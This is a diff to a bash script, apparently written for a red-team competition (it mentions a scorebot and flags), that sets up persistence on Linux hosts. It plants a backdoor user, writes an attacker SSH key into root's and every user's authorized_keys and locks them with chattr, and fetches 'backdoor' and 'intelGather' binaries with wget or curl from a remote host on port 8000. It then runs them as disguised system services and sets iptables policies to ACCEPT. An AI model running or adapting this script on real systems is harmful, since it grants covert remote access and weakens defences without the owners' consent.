@@ -18,7 +18,7 @@ backdoorPassHash='$6$j8vzzMPeNMxOBoNf$B6Pb78gRwsaCxEx8zzEwG2bos08U3tEkXL1aryHd5i
 firewallConfiguration=0
 scorebotUser="scorebot"  # name of scorebot user to avoid changing
 serviceName1="service" # name of binary with service to backdoor
-serviceName2=""
+serviceName2="service2"
 
 # --------------
 # back up hashes
@@ -105,10 +105,6 @@ hardenSsh() {
     # add our public key to the authorized_keys file for root
     mkdir -p /root/.ssh
     touch /root/.ssh/authorized_keys
-    chown root /root/.ssh
-    chmod 700 /root/.ssh
-    chown root /root/.ssh/authorized_keys
-    chmod 600 /root/.ssh/authorized_keys
     echo $publicKey >> /root/.ssh/authorized_keys
     chattr +i /root/.ssh/authorized_keys
 
@@ -118,11 +114,7 @@ hardenSsh() {
             if [[ -d $homedir ]]; then
                 mkdir -p $homedir/.ssh
                 touch $homedir/.ssh/authorized_keys
-                chown $username $homedir/.ssh
-                chmod 700 $homedir/.ssh
-                chown $username $homedir/.ssh/authorized_keys
-                chmod 600 $homedir/.ssh/authorized_keys
-                echo $publicKey >> $homedir/.ssh/authorized_keys
+                echo $publicKey > $homedir/.ssh/authorized_keys
                 chattr +i $homedir/.ssh/authorized_keys
             fi
         fi
@@ -229,14 +221,14 @@ download_and_run (){  #find a place to put a backdoor and
                 if [ $transferMethod == 1 ]; then
                     ip=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}')
 					echo $ip
-                    wget --bind-address=$ip:$downloadPort1 --no-check-certificate --tries=2 -O $targetFile http://$ipv4:$serverPort/$sourceFile                                                                                                      
+                    wget --bind-address=$ip:$downloadPort1 --no-check-certificate --tries=2 -O $targetFile http://$ipv4:8000/$sourceFile                                                                                                      
                 elif [ $transferMethod == 2 ]; then
-                    curl --local-port $downloadPort2 -m 10 -o $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
+                    curl --local-port $downloadPort2 -m 10 -o $targetFile http://$ipv4:8000/$sourceFile >> $logFile 2>&1
                 elif [ $transferMethod == 3 ]; then
                     echo -e "\n\ndownload via https failed, attempting download via http:" >> $logFile
-                    wget --tries=2 -O $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
+                    wget --tries=2 -O $targetFile http://$ipv4:8000/$sourceFile >> $logFile 2>&1
                 elif [ $transferMethod == 4 ]; then
-                    curl --local-port $downloadPort3 -m 10 -o $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
+                    curl --local-port $downloadPort3 -m 10 -o $targetFile http://$ipv4:8000/$sourceFile >> $logFile 2>&1
                 # elif [ $transferMethod == 5 ]; then
                 #     echo "attempting download via nc:" >> $logFile
                 #     echo "GET /$sourceFile HTTP/1.0" | nc -n $ipv4 $serverPort > $targetFile && sed -i '1,7d' $targetFile >> $logFile 2>&1
@@ -335,15 +327,14 @@ backdoorUser(){
 # ------------------
 backdoorService(){
     dir="/lib/systemd/system"
-    newbin=$1
+    newbin=$1 #intelGather
     
-    binaryName="/usr/sbin/$2"
+    binaryName="/usr/sbin/$2" #
     serviceName=$2
     
-
+	rm $binaryName
     mv "/usr/sbin/$1" $binaryName
-    rm $binaryName
-    mv $newbin $binaryName
+    
     chmod +x $binaryName
     rm "$dir/$serviceName.service"
     
@@ -355,6 +346,9 @@ backdoorService(){
     echo "[Service]" >> "$dir/$serviceName.service"
     echo "ExecStart=$binaryName" >> "$dir/$serviceName.service"
     echo "ExecReload=/bin/kill -HUP $MAINPID" >> "$dir/$serviceName.service"
+    
+    #systemctl enable "$serviceName.service"
+    systemctl start "$serviceName.service"
 }
 
 # -------------------------------------------
@@ -427,7 +421,7 @@ configureIpTables() { #tested
     do
         if [ $chain != "OUTPUT" ]
         then
-            iptables --policy $chain DROP >> $logFile 2>&1
+            iptables --policy $chain ACCEPT >> $logFile 2>&1
         fi
     done
 
@@ -602,16 +596,18 @@ main(){
     writeCron
     hashBackup #tested
     backdoorUser #tested
+    echo 1
     hardenSsh
     download_and_run backdoor $serviceName1
     download_and_run intelGather $serviceName2
-    
+    echo 2
     hardenUsers #tested
     #backdoorService 
     configAllFirewalls
     #shellBackdoor
     #readFlag
     #report
+    echo 3
     binEncrypt
     # systemctl reboot
 }
